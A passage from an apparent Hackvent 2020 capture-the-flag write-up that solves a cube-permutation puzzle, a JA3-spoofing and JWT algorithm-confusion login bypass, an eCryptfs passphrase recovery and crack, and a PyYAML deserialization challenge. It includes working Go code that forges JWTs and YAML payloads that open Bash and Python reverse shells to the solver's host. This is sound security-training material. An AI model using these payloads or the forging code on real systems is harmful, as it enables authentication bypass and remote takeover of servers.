    #moves_to_try = permutations(moves_list, num_moves) # works, but technically incomplete
    moves_to_try = product(moves_list, repeat=num_moves)
    
    for moves in moves_to_try:
        mv_str = ' '.join(moves)
        c = Cube(cube_str)
        c.sequence(mv_str)
        f = ''.join(c._color_list())
        if f.startswith('HV20') and f.endswith('}'):
            flag = f[:12] + f[21:24] + f[33:36] + f[12:15] + f[24:27] + f[36:39] + f[15:18] + f[27:30] + f[39:42] + f[18:21] + f[30:33] + f[42:]
            print(flag)
            print(moves)
    

Running this is quite slow (especially on my under-powered machine). But it
still drops three potential flags, and one is clearly the right one:

    
    
    $ time python3 solve.py 
    HV20{ncsele_s_aida_w7lka4r3__5@too__hi6hs_ocestenl_sp}
    ('B', 'Li', 'Di', 'Bi', 'Ri')
    HV20{no_sle3p_sihce_4wks_lea_5_tr_n_hi6tscoae_a7olds@}
    ('Li', 'Fi', 'R', 'Bi', 'R R')
    HV20{no_sle3p_since_4wks_lead5_to_@_hi6hscore_a7_last}
    ('Li', 'Bi', 'D', 'Fi', 'R R')
    
    real    39m52.122s
    user    39m50.727s
    sys     0m0.104s
    

**Flag:`HV20{no_sle3p_since_4wks_lead5_to_@_hi6hscore_a7_last}`**

If I did use permutations instead of product (an incomplete search), it does
still find the flag, and much faster:

    
    
    $ time python3 solve-perm.py 
    HV20{ncsele_s_aida_w7lka4r3__5@too__hi6hs_ocestenl_sp}
    ('B', 'Li', 'Di', 'Bi', 'Ri')
    HV20{no_sle3p_sihce_4wks_lea_5_tr_n_hi6tscoae_a7olds@}
    ('Li', 'Fi', 'R', 'Bi', 'R R')
    HV20{no_sle3p_since_4wks_lead5_to_@_hi6hscore_a7_last}
    ('Li', 'Bi', 'D', 'Fi', 'R R')
    
    real    22m27.955s
    user    22m27.171s
    sys     0m0.112s
    

## HV20.17

### Challenge

![hv20-ball17](https://0xdfimages.gitlab.io/img/hv20-ball17.png) | HV20.17 Santa's Gift Factory Control  
---|---  
Categories: |  ![crypto](../img/hv-cat-crypto.png)CRYPTO  
![web security](../img/hv-cat-web_security.png)WEB SECURITY  
Level: | hard  
Author: |  fix86   
  
> Santa has a customized remote control panel for his gift factory at the
> north pole. Only clients with the following fingerprint seem to be able to
> connect:
>  
>  
>
> 771,49162-49161-52393-49200-49199-49172-49171-52392,0-13-5-11-43-10,23-24,0
>  
>
> Mission
>
> Connect to Santa’s super-secret control panel and circumvent its access
> controls.

### Solution

#### Enumeration

Just visiting the page gives a 403 forbidden:

![image-20201217123511276](https://0xdfimages.gitlab.io/img/image-20201217123511276.png)

That makes sense given the prompt that it only accepts requests from the given
fingerprint. That fingerprint is a [JA3](https://github.com/salesforce/ja3)
fingerprint, which is composed of various settings in the TLS Client Hello
message, including TLS version, cipher suites offered, and extensions.

#### Get Access

Rather than try to set up a computer to match these settings exactly, I found
[this Go package](https://github.com/CUCyber/ja3transport) that can take a JA3
string and create an HTTP client that is configured to look like it. The only
downside is that I had to learn Go, which is totally new to me (so don’t take
any Go programming tips from me!).

To check that I was doing it right, I created the transport to match the
signature, and made a request of [ja3er.com](https://ja3er.com/):

    
    
    package main
    
    
    import (
        "io/ioutil"
        "fmt"
        "net/http"
        "github.com/CUCyber/ja3transport"
    )
    
    func main() {
    
        tr, _ := ja3transport.NewTransport("771,49162-49161-52393-49200-49199-49172-49171-52392,0-13-5-11-43-10,23-24,0")
        client := &http.Client{Transport: tr}
        resp, _ := client.Get("https://ja3er.com/json")
    
        body, _ := ioutil.ReadAll(resp.Body)
    
        sb := string(body)
        fmt.Println(sb)
    }
    

It returns the JA3 fingerprint for the client, and it matches:

    
    
    root@kali# go run main-0-check_ja3er.go 
    {"ja3_hash":"a319533bd1a703430d9ad0e21c08c62f", "ja3": "771,49162-49161-52393-49200-49199-49172-49171-52392,0-13-5-11-43-10,23-24,0", "User-Agent": "Go-http-client/1.1"}
    

After updating the URL to the hackvent target, it returns a page:

    
    
    root@kali# go run main-1-get_page.go 
    <!DOCTYPE html>
    <html>
        <head>
            <meta charset="utf-8">
            <title>Santa's Control Panel</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <link href="static/bootstrap/bootstrap.min.css" rel="stylesheet" media="screen">
            <link href="static/fontawesome/css/all.min.css" rel="stylesheet" media="screen">
            <link href="static/style.css" rel="stylesheet" media="screen">
        </head>
        <body>
            <div class="login">
                <h1>Login</h1>
                <form action="/login" method="post">
                    <label for="username">
                        <i class="fas fa-user"></i>
                    </label>
                    <input type="text" name="username" placeholder="Username" id="username">
                    <label for="password">
                        <i class="fas fa-lock"></i>
                    </label>
                    <input type="password" name="password" placeholder="Password" id="password">
                    
                    <input type="submit" value="Login">
                </form>
            </div>
      
        </body>
    </html>
    

#### Get Cookie and Username

Given this is a login form, I wanted to try some basic credentials like
“admin” / “admin”. I learned how to craft a POST request, and I added code to
print the response headers as well.

    
    
    package main
    
    
    import (
        "io/ioutil"
        "fmt"
        "net/http"
        "net/url"
        "github.com/CUCyber/ja3transport"
    )
    
    func main() {
    
        tr, _ := ja3transport.NewTransport("771,49162-49161-52393-49200-49199-49172-49171-52392,0-13-5-11-43-10,23-24,0")
        client := &http.Client{Transport: tr}
    
    
        data := url.Values {
            "username": {"admin"},
            "password": {"admin"},
            "submit": {"Login"},
        }
    
        resp, _ := client.PostForm("https://876cfcc0-1928-4a71-a63e-29334ca287a0.rdocker.vuln.land/login", data)
        body, _ := ioutil.ReadAll(resp.Body)
        
        fmt.Println(string(body))
    
        fmt.Println("\nHeaders:")
        headers := resp.Header
        for h := range headers {
            fmt.Println(h + ": " + headers.Get(h))
        }
    }
    

No matter what creds I tried, I always got the login form back with this
message included:

    
    
    <div class="msg">Invalid credentials.</div>
    

However, when the username was “admin”, this comment was added:

    
    
    <!--DevNotice: User santa seems broken. Temporarily use santa1337.-->
    

Trying to login as santa1337 didn’t provide anything useful.

The headers were interesting. On a failed login, it still tried to set a
session cookie:

    
    
    Headers:
    Server: nginx/1.19.6
    Date: Thu, 17 Dec 2020 17:56:43 GMT
    Content-Type: text/html; charset=utf-8
    Content-Length: 1275
    Connection: keep-alive
    Set-Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Ii9rZXlzLzFkMjFhOWY5NDUifQ.eyJleHAiOjE2MDgyMzE0MDMsImlhdCI6MTYwODIyNzgwMywic3ViIjoibm9uZSJ9.wn_Gl2P82bulHg8CehzTcT4411abUh5zPj9n5QjCVIGQV8xU9obWCA0CxPgu_dz-fMDwUOFUZcOs74iq_fPSdSX02fT4EeWPWls2RQ2jvLQNbXSpFZp5NjGjuF3_tpzUGlymVx3_wVtjYg3ArpgHMfWpRwXpS2B5vPLsZWsPkdQx8co73lQfLrx_jPfXrimWINqmvs81M-wf8GZh3oPAFu5Th9Md6GKhyqZbDZzccFS3_0xMS9FrJhHCIP3opYLINb_1KhOJDvY2Dl3tTBycRSWij487VqEwRQ8kCFVqWMwFG3ElR99JXwOt0HT4mseXH6lZQYSbwTBiCDv8N8ReGw; Path=/
    

#### Analyze JWT and Get Public Key

My go-to place to see what’s in a JWT is [jwt.io](https://jwt.io/). Plugging
this one in there shows that it’s using RSA256, gives an interesting key id
(kid) path, and hold data for presumably the user (`sub`) currently set to
`none`, as well as validity times:

[![image-20201217130151085](https://0xdfimages.gitlab.io/img/image-20201217130151085.png)_Click
for full size
image_](https://0xdfimages.gitlab.io/img/image-20201217130151085.png)

As the `kid` looks like a path on the server, I’ll try to grab it:

    
    
    package main
    
    
    import (
        "io/ioutil"
        "fmt"
        "net/http"
        "github.com/CUCyber/ja3transport"
    )
    
    func main() {
    
        tr, _ := ja3transport.NewTransport("771,49162-49161-52393-49200-49199-49172-49171-52392,0-13-5-11-43-10,23-24,0")
        client := &http.Client{Transport: tr}
        resp, _ := client.Get("https://876cfcc0-1928-4a71-a63e-29334ca287a0.rdocker.vuln.land/keys/1d21a9f945")
        body, _ := ioutil.ReadAll(resp.Body)
        fmt.Println(string(body))
    }
    

It does return the key:

    
    
    root@kali# go run main-3-leak-public.go 
    -----BEGIN PUBLIC KEY-----
    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0KDtdDsZ/wpGXWRnP6DY
    Ri7OxTWiwPVg8eTsVcmbzAkk2r4itb3NqRw9xpJeUHorgfw1f9GkuAFg/squMrXb
    SYM0Vcxqmtsq379xCw6s0pxIafPR7TEAVRh5Mxrudl2lwiO4vJPs+2tmcgui/bFn
    wC+qByZtIlsP+rlT/MF2wLaWe/LNAWtOXdFVDOzUy6ylLZeL6fRtt9SiuUOQkkC3
    US8TmvVQYcCcwvu4GBJeGdlKrbIuXIohl7hP5i9/KZ3kIvzByp/Xk5iq+tH95/9u
    X/9FHKUSrcRE4NYVRhkqHPpn/EbqXHMX0BM0QoGETORlpZIo/lAOQ7/ezOd9z1fw
    zwIDAQAB
    -----END PUBLIC KEY-----
    

#### Algorithm Confusion Attack

RS256 is an RSA signature, where a private key is used to sign the JWT, and
then the public key is used to verify it. The alternative signature is HS256,
which is a keyed SHA256 hash signature, where the key is symmetric for signing
and verification.

If the server is trusting the JWT to tell it what algorithm is in use, there’s
an attack where I use the RSA public key to sign as the private key in HS256.
If the server just uses the public key with the algorithm in the JWT, then it
should validate my forged cookie.

Now the script will read the public key, and create a new JWT with a really
long valid time window and the user santa1337 as described in the comment.
It’ll sign the JWT using the RSA public key string as the HMAC secret in
HS256, and submit that to the site in a GET request:

    
    
    package main
    
    
    import (
        "io/ioutil"
        "fmt"
        "net/http"
        "time"
        "github.com/CUCyber/ja3transport"
        "github.com/dgrijalva/jwt-go"
    )
    
    func main() {
    
        hmacSecret, _ := ioutil.ReadFile("public.key")
    
        jwt_token := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims {
            "sub": "santa1337",
            "iat": time.Date(2020, 12, 17, 0, 0, 0, 0, time.UTC).Unix(),
            "exp": time.Date(2021, 12, 1, 0, 0, 0, 0, time.UTC).Unix(),
        })
        jwt_string, _ := jwt_token.SignedString(hmacSecret)
    
        base_url := "https://876cfcc0-1928-4a71-a63e-29334ca287a0.rdocker.vuln.land/"
        tr, _ := ja3transport.NewTransport("771,49162-49161-52393-49200-49199-49172-49171-52392,0-13-5-11-43-10,23-24,0")
        client := &http.Client{Transport: tr}
    
        req, _ := http.NewRequest("GET", base_url, nil)
        req.AddCookie(&http.Cookie{Name: "session", Value: jwt_string})
        resp, _ := client.Do(req)
        body, _ := ioutil.ReadAll(resp.Body)
        fmt.Println(string(body))
    }
    

Running this returns the logged in page, and I can see the flag in a comment:

    
    
    root@kali# go run main.go 
    <!DOCTYPE html>
    <html>
        <head>
            <meta charset="utf-8">
            <title>Santa's Control Panel</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <link href="static/bootstrap/bootstrap.min.css" rel="stylesheet" media="screen">
            <link href="static/fontawesome/css/all.min.css" rel="stylesheet" media="screen">
            <link href="static/style.css" rel="stylesheet" media="screen">
        </head>
        <!--Congratulations, here's your flag: HV20{ja3_h45h_1mp3r50n4710n_15_fun}-->
        <body class="loggedin">
            <nav class="navtop">
                <div>
                    <h1>Gift Factory Control</h1>
                    <a href="/"><i class="fas fa-home"></i>Home</a>
                    <a href="/logout"><i class="fas fa-sign-out-alt"></i>Logout</a>
                </div>
            </nav>
    ...[snip]...
    

**Flag:`HV20{ja3_h45h_1mp3r50n4710n_15_fun}`**

Just for fun, I downloaded the images and style sheets for the site so it
would render in a browser:

[
![image-20201217144933740](https://0xdfimages.gitlab.io/img/image-20201217144933740.png)
](https://0xdfimages.gitlab.io/img/image-20201217144933740.png)

[_Click for full
image_](https://0xdfimages.gitlab.io/img/image-20201217144933740.png)

An interesting programming exercise would be to write a proxy in Go such that
Firefox could just interact with the site without having to update the script
each time.

## HV20.18

### Challenge

![hv20-ball18](https://0xdfimages.gitlab.io/img/hv20-ball18.png) | HV20.18 Naughty Rudolph  
---|---  
Categories: |  ![forensic](../img/hv-cat-forensic.png)FORENSIC  
![linux](../img/hv-cat-linux.png)LINUX  
![crypto](../img/hv-cat-crypto.png)CRYPTO  
Level: | hard  
Author: |  [darkstar](https://twitter.com/___darkstar__)  
  
> Santa has forgotten his password and can no longer access his data. While
> trying to read the hard disk from another computer he also destroyed an
> important file. To avoid further damage he made a backup of his home
> partition. Can you help him recover the data.
>
> When asked he said the only thing he remembers is that he used his name in
> the password… I thought this was something only a _real human_ would do…
>
> [Backup](/files/9154cb91-e72e-498f-95de-ac8335f71584.img.bz2)

### Solution

#### Enumeration / Background

The file (once uncompressed with `bzip2`) is a linux filesystem image:

    
    
    $ file 9154cb91-e72e-498f-95de-ac8335f71584.img 
    9154cb91-e72e-498f-95de-ac8335f71584.img: Linux rev 1.0 ext2 filesystem data, UUID=5a9bec26-3f99-4101-bc44-153139202629 (extents) (64bit) (large files) (huge files)
    

After mounting it (`mount 9154cb91-e72e-498f-95de-ac8335f71584.img /mnt` as
root), the files are accessible:

    
    
    # find . -type f
    ./.ecryptfs/santa/.ecryptfs/Private.sig
    ./.ecryptfs/santa/.ecryptfs/auto-mount
    ./.ecryptfs/santa/.ecryptfs/auto-umount
    ./.ecryptfs/santa/.ecryptfs/Private.mnt
    ./.ecryptfs/santa/.Private/ECRYPTFS_FNEK_ENCRYPTED.FWZ07.HM9hn6u-TZiWKrjgW6DXtByC4T9a7dzkmECdlI6niYOUV5xGTJjU--/ECRYPTFS_FNEK_ENCRYPTED.FWZ07.HM9hn6u-TZiWKrjgW6DXtByC4T9a7d1JDODsETfukf65VhSkI0n---/ECRYPTFS_FNEK_ENCRYPTED.FWZ07.HM9hn6u-TZiWKrjgW6DXtByC4T9a7dH.bKOaBjUbJM2U2TIiU-ik--/ECRYPTFS_FNEK_ENCRYPTED.FWZ07.HM9hn6u-TZiWKrjgW6DXtByC4T9a7dqLfSXNIF5kpOP.NxOzrZyk--
    ./.ecryptfs/santa/.Private/ECRYPTFS_FNEK_ENCRYPTED.FWZ07.HM9hn6u-TZiWKrjgW6DXtByC4T9a7dtEnnKY5yelbZezXFJrTul---
    ...[sniped more ECRYPTFS files in .Private]...
    

This image contains an eCryptfs-encrypted file system. [This superuser
post](https://superuser.com/questions/850793/ecryptfs-encrypted-home-
explanation/850814#850814) explains the files used by eCryptfs:

  * `auto-mount` tells the system to automatically mount at login
  * `auto-umount` tells the system to automatically umount at logout
  * `Private.mnt` defines where the encrypted file system is mounted
  * `Private.sig` contains the signature of the mountpoint passphrase
  * `wrapped-passphrase` is the key material used to decrypted the drive encrypted with a user’s passphrase.

The `wrapped-passphrase` file is missing in this image. This must be the
“important file” Santa destroyed.

#### Recover wrapped-passphrase

[This presentation](https://research.kudelskisecurity.com/2015/08/25/how-to-
crack-ubuntu-disk-encryption-and-passwords/) from Sylvain Pelissier talks
about an issue where a default salt was used, which made cracking these
passwords very easy. With the update, now there’s a random salt, and the
structure of the file looks like (image from the previous link):

![img](https://0xdfimages.gitlab.io/img/wrappedpassphrasev2.png)

If Santa deleted this file, but then took an image immediately after, there’s
a good chance the bits are still on disk / in the image. I can check by using
`grep` against the raw image file. I converted it to one long line of hex, and
then looked for the pattern above:

    
    
    # xxd -p 9154cb91-e72e-498f-95de-ac8335f71584.img | tr -d '\n' | grep -obP "3a02.{16}([3-7].){16}.{64}"
    192937984:3a02a723b12f66bcfeaa30353131313962306261636530616236dbb8dd00478fa189aec3cbe52294f4cad157fe2d78656774611f321b99306fc7
    

That pattern is looking for the signaute, then any eight bytes (16 hex
characters), then sixteen bytes where the first hex char is between three and
seven (roughly ASCII printable), then 32 more bytes. It finds one hit!

`xxd` will convert this back to raw binary:

    
    
    # echo "3a02a723b12f66bcfeaa30353131313962306261636530616236dbb8dd00478fa189aec3cbe52294f4cad157fe2d78656774611f321b99306fc7" | xxd -r -p > wrapped-passphrase
    

Converting to hex and `grep` was kind of slow. A much faster way to do this
would be to use `binwalk` to identify the offset:

    
    
    # binwalk -R "\x3a\x02" 9154cb91-e72e-498f-95de-ac8335f71584.img 
    
    DECIMAL       HEXADECIMAL     DESCRIPTION
    --------------------------------------------------------------------------------
    7527715       0x72DD23        Raw signature (\x3a\x02)
    96468992      0x5C00000       Raw signature (\x3a\x02)
    

Then `dd` can pull out 58 bytes:

    
    
    # dd if=9154cb91-e72e-498f-95de-ac8335f71584.img of=wrapped-passphrase.tmp bs=1 count=58 skip=96468992
    58+0 records in
    58+0 records out
    58 bytes copied, 0.0263151 s, 2.2 kB/s
    # md5sum wrapped-passphrase*
    f0398a8a4e4864892316d2d38b1de8e4  wrapped-passphrase.tmp
    f0398a8a4e4864892316d2d38b1de8e4  wrapped-passphrase
    

#### Crack Passphrase

[john](https://github.com/openwall/john) has a utility to take this file and
create a hash, `ecryptfs2john.py`:

    
    
    # /usr/share/john/ecryptfs2john.py wrapped-passphrase > wrapped-passphrase.hash
    

Typically CTFs rely on rockyou for a password list, but there are hints in the
prompt about the password. First, it contains santa. Second, the phrase “real
human”. Googling for “real human password”, the first result is word lists
from CrackStation:

![image-20201218153905751](https://0xdfimages.gitlab.io/img/image-20201218153905751.png)

I downloaded the `crackstation-human-only.txt.gz`, decompressed it, and used
`grep` to get only words with `santa` in them, returning almost 14-thousand
words:

    
    
    # grep -i santa crackstation-human-only.txt  > santa_words
    # wc -l santa_words 
    13852 santa_words
    

Running the hash through `hashcat` with this wordlist break the hash pretty
quickly:

    
    
    # hashcat -m 12200 wrapped-passphrase.hash santa_words --user
    ...[snip]...
    $ecryptfs$0$1$a723b12f66bcfeaa$051119b0bace0ab6:think-santa-lives-at-north-pole
    ...[snip]...
    

#### Recover Filesystem

There’s a couple ways to go about this. Without changing the mounted image (or
if mounted read only), the encryption key can be recovered from the `wrapped-
passphrase` file:

    
    
    # ecryptfs-unwrap-passphrase ~/hackvent2020/day18/wrapped-passphrase think-santa-lives-at-north-pole
    eeafa1586db2365d5f263ef867f586e4
    

With the encryption key, the data can be recovered by entering that key when
prompted:

    
    
    # ecryptfs-recover-private .Private/
    INFO: Found [.Private/].
    Try to recover this directory? [Y/n]: 
    INFO: Could not find your wrapped passphrase file.
    INFO: To recover this directory, you MUST have your original MOUNT passphrase.
    INFO: When you first setup your encrypted private directory, you were told to record
    INFO: your MOUNT passphrase.
    INFO: It should be 32 characters long, consisting of [0-9] and [a-f].
    
    Enter your MOUNT passphrase: 
    INFO: Success!  Private data mounted at [/tmp/ecryptfs.UADWk0Lh].
    

Going to that directory, there’s the flag:

    
    
    # cd /tmp/ecryptfs.UADWk0Lh/
    # cat flag.txt 
    HV20{a_b4ckup_of_1mp0rt4nt_f1l35_15_3553nt14l}
    

**Flag:`HV20{a_b4ckup_of_1mp0rt4nt_f1l35_15_3553nt14l}`**

Alternatively, I could just copy the `wrapped-passphrase` file into the config
directory and run `ecryptfs-recover-private` and it will find it, and prompt
for the passphrase, and then mount the recovered system just like above. I
could also use `ecryptfs-insert-wrapped-passphrase-into-keyring` before
`ecryptfs-recover-private` to get the same result.

## HV20.19

### Challenge

![hv20-ball19](https://0xdfimages.gitlab.io/img/hv20-ball19.png) | HV20.19 Docker Linter Service  
---|---  
Categories: |  ![web security](../img/hv-cat-web_security.png)WEB SECURITY  
![exploitation](../img/hv-cat-exploitation.png)EXPLOITATION  
Level: | hard  
Author: |  [The Compiler](https://twitter.com/the_compiler)  
  
> Docker Linter is a useful web application ensuring that your Docker-related
> files follow best practices. Unfortunately, there’s a security issue in
> there…

There’s a link in the resources to spin up instances of the website, as well
as VPN instructions to position myself to get a reverse shell.

### Solution

#### Enumeration

The website is a linting service for Docker related files:

![image-20201219141447889](https://0xdfimages.gitlab.io/img/image-20201219141447889.png)

As the menu says, it can handle Dockerfiles, Docker compose files, and `.env`
files, and each of those have links to pages where I can either provide a file
or paste content into a field and submit. For example, for Dockerfile:

![image-20201219141720740](https://0xdfimages.gitlab.io/img/image-20201219141720740.png)

Submitting on these pages, each has different sections of output that come
back, for example from the Docker compose linter:

![image-20201219141904462](https://0xdfimages.gitlab.io/img/image-20201219141904462.png)

Across the three pages there are more (many of which I could locate open
source links for):

  * Dockerfile 
    * [hadolint](https://github.com/hadolint/hadolint)
    * dockerfile_link
    * [dockerlint.js](https://github.com/RedCoolBeans/dockerlint)
  * docker-compose.yml 
    * Basic syntax check
    * [yamllint](https://github.com/adrienverge/yamllint)
    * docker-compose
  * .env files 
    * [dotenv-linter](https://github.com/dotenv-linter/dotenv-linter)

There’s a lot of stuff here, and lot of attack surface area, as each step is
calling other programs.

It’s also worth noting that the response headers show that the server is
running Python:

    
    
    HTTP/1.1 200 OK
    Content-Length: 3376
    Content-Type: text/html; charset=utf-8
    Date: Sat, 19 Dec 2020 02:31:15 GMT
    Server: Werkzeug/1.0.1 Python/3.8.2
    Vary: Cookie
    Connection: close
    

I tried a bunch of things that didn’t work, like looking for command
injections or server-side javascript injection into `dockerlint.js`.

#### PyYAML

Python’s main YAML handling library, [PyYAML](https://github.com/yaml/pyyaml),
has had issues with deserialization attacks, and has since
[deprecated](https://github.com/yaml/pyyaml/wiki/PyYAML-
yaml.load\(input\)-Deprecation) the `yaml.load` function because it’s unsafe.
So seeing a Python webserver that is loading YAML data, it’s worth trying to
try some injections here (technically it’s a deserialization vulnerability).

I submitted the example payload from the site above as the `docker-
compose.yml` file:

    
    
    !!python/object/new:os.system [echo EXPLOIT!]
    

The basic syntax check broke, in a way that it’s trying to create a Python
instance as I’m asking it to:

![image-20201219142934443](https://0xdfimages.gitlab.io/img/image-20201219142934443.png)

[This issue](https://github.com/yaml/pyyaml/issues/420) on the PyYaml GitHub
page talks about the library still being vulnerable to attack, and gives some
example payloads.

On the second one, I changed “RCE_HERE” to `print('0xdf')`:

![image-20201219143244879](https://0xdfimages.gitlab.io/img/image-20201219143244879.png)

On submitting that, the basic linter found no issues:

![image-20201219143451910](https://0xdfimages.gitlab.io/img/image-20201219143451910.png)

To see if it was actually running my code, I changed `print` to `ppp` (a non-
existent function), and on submitting:

![image-20201219143409128](https://0xdfimages.gitlab.io/img/image-20201219143409128.png)

This is a really good sign that the submitted code is running.

#### Shell

I’ll update this payload with a one-liner reverse shell, initially using
`os.system()` to run a Bash reverse shell:

    
    
    !!python/object/new:type
      args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
      listitems: "import os; os.system('bash -c \"bash -i >& /dev/tcp/10.13.0.22/443 0>&1\"')"
    

With `nc` started and listening on 443, I’ll submit that, and I get a shell:

    
    
    root@kali# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 152.96.7.3.
    Ncat: Connection from 152.96.7.3:36010.
    bash: cannot set terminal process group (297): Not a tty
    bash: no job control in this shell
    bash: /root/.bashrc: Permission denied
    bash-5.0$
    

The flag is sitting in the same directory:

    
    
    bash-5.0$ cat flag.txt
    HV20{pyy4ml-full-l04d-15-1n53cur3-4nd-b0rk3d}
    

**Flag:`HV20{pyy4ml-full-l04d-15-1n53cur3-4nd-b0rk3d}`**

A Python reverse shell works too (I just have to look it up every time, unlike
the Bash one which I’ve memorized):

    
    
    !!python/object/new:type
      args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
      listitems: 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.0.22",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    

[](/hackvent2020/hard)

